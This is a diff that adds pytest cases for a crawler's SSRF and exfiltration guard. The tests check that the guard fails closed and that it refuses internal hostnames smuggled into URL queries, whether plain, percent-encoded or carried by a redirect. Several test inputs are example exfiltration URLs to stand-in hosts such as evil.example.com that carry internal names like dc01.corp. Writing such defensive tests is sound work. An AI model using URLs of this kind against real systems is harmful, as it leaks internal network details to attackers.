@@ -191,6 +191,33 @@ async def test_connect_error_graceful() -> None:
 
 
 @pytest.mark.asyncio
+async def test_preflight_exception_fails_closed() -> None:
+    """A redirect preflight that RAISES must refuse the crawl (fail closed), not
+    hand crawl4ai the unvalidated original url (fail open).
+
+    crawl4ai follows 30x server-side that we never see. A server that resets or
+    fingerprints the preflight client so it excepts could then serve crawl4ai a
+    302 to an internal target — the redirect-SSRF this preflight exists to close.
+    A verification we could not complete is a refusal, not a pass — even though
+    the /md endpoint here WOULD have succeeded if reached.
+    """
+    md_calls = {"n": 0}
+
+    def h(req: httpx.Request) -> httpx.Response:
+        if req.url.path.endswith("/md"):
+            md_calls["n"] += 1
+            return httpx.Response(200, json={"markdown": "should never fetch", "success": True})
+        # The preflight HEAD/GET on the original url cannot complete.
+        raise httpx.ConnectError("preflight reset by peer", request=req)
+
+    with _patch_httpx(h), _patch_resolve("93.184.216.34"):
+        r = await crawl_page("https://abuse.example.com/start", settings=_settings())
+    assert r["ok"] is False
+    assert "refused" in r["error"]
+    assert md_calls["n"] == 0  # crawl4ai was never handed the unvalidated url
+
+
+@pytest.mark.asyncio
 async def test_public_host_resolving_to_internal_ip_refused() -> None:
     """SSRF: an external NAME whose A record points at a private/loopback/
     link-local/metadata IP must be refused — never reach the network."""
@@ -438,6 +465,107 @@ async def test_dns_guard_runs_off_event_loop() -> None:
         )
     assert ran_concurrently["v"] is True  # loop stayed responsive during the resolve
     assert results[0]["ok"] is True
+
+
+@pytest.mark.asyncio
+async def test_url_query_internal_identifier_refused() -> None:
+    """Exfil channel: an internal FQDN smuggled into the QUERY string of an
+    otherwise-external URL is refused before any network I/O — the host-only guard
+    never inspects the query."""
+    calls = {"n": 0}
+
+    def h(req: httpx.Request) -> httpx.Response:
+        calls["n"] += 1
+        return httpx.Response(200, json={})
+
+    with _patch_httpx(h), _patch_resolve():
+        r = await crawl_page(
+            "https://evil.example.com/check?h=dc01.corp&u=jdoe", settings=_settings()
+        )
+    assert r["ok"] is False
+    assert "refused" in r["error"]
+    assert calls["n"] == 0
+
+
+@pytest.mark.asyncio
+async def test_url_encoded_internal_identifier_refused() -> None:
+    """The URL is decoded ONCE before scanning, so a percent-encoded internal
+    FQDN in the query (``dc01%2Ecorp``) cannot slip past."""
+    calls = {"n": 0}
+
+    def h(req: httpx.Request) -> httpx.Response:
+        calls["n"] += 1
+        return httpx.Response(200, json={})
+
+    with _patch_httpx(h), _patch_resolve():
+        r = await crawl_page("https://evil.example.com/x?h=dc01%2Ecorp", settings=_settings())
+    assert r["ok"] is False
+    assert "refused" in r["error"]
+    assert calls["n"] == 0
+
+
+@pytest.mark.asyncio
+async def test_redirect_target_query_internal_identifier_refused() -> None:
+    """The same whole-URL scan runs on every redirect target's query, so a 302 to
+    an EXTERNAL host carrying an internal FQDN in its query is refused before
+    crawl4ai is handed anything."""
+    md_calls = {"n": 0}
+
+    def h(req: httpx.Request) -> httpx.Response:
+        if req.url.path.endswith("/md"):
+            md_calls["n"] += 1
+            return httpx.Response(200, json={"markdown": "leaked", "success": True})
+        if req.url.path == "/start":  # the external page 302s to an external host…
+            return httpx.Response(
+                302, headers={"location": "https://other.example.net/c?h=dc01.corp"}
+            )
+        return httpx.Response(200)  # …whose /c is terminal (would be crawled but for the scan)
+
+    with _patch_httpx(h), _patch_resolve():
+        r = await crawl_page("https://evil.example.com/start", settings=_settings())
+    assert r["ok"] is False
+    assert "refused" in r["error"]
+    assert md_calls["n"] == 0
+
+
+@pytest.mark.asyncio
+async def test_clean_external_url_with_query_passes() -> None:
+    """A clean external URL with a query string (a public IP included) is NOT
+    over-refused and reaches crawl4ai."""
+    payload = {"markdown": "public page", "success": True}
+
+    def h(req: httpx.Request) -> httpx.Response:
+        return httpx.Response(200, json=payload)
+
+    with _patch_httpx(h), _patch_resolve():
+        r = await crawl_page(
+            "https://abuse.example.com/report?id=123&ref=8.8.8.8", settings=_settings()
+        )
+    assert r["ok"] is True
+    assert "public page" in r["content"]
+
+
+@pytest.mark.asyncio
+async def test_db_discovered_suffix_in_query_caught_when_env_empty() -> None:
+    """A DB-discovered internal suffix (empty .env) is threaded into the guard, so
+    an internal FQDN on that suffix in the query is refused."""
+    calls = {"n": 0}
+
+    def h(req: httpx.Request) -> httpx.Response:
+        calls["n"] += 1
+        return httpx.Response(200, json={})
+
+    s = _settings(oracle_internal_suffixes=())  # env has NO suffixes
+    with _patch_httpx(h), _patch_resolve():
+        r = await crawl_page(
+            "https://evil.example.com/c?h=dc01.acme-corp.example",
+            settings=s,
+            suffixes=(".acme-corp.example",),
+            extra_hosts=(),
+        )
+    assert r["ok"] is False
+    assert "refused" in r["error"]
+    assert calls["n"] == 0
 
 
 def test_wiring_dispatch_and_literal() -> None:
